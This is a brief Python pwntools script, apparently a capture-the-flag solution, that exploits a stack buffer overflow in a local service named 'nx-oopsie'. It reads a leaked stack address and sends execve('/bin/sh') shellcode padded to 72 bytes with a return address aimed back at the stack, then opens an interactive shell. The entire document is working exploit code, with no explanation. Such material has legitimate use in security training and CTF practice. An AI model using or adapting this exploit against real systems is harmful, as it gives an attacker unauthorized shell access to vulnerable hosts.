from pwn import *

BUF_SIZE = 72

#p = process("./nx-oopsie")
p = remote('localhost', 4444)

stack_addr = int(p.recvline().decode().split(":")[1][1:],16)
# http://shell-storm.org/shellcode/files/shellcode-806.php
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(BUF_SIZE, b'a')
payload += p64(stack_addr - 64)
p.sendline(payload)
p.interactive()
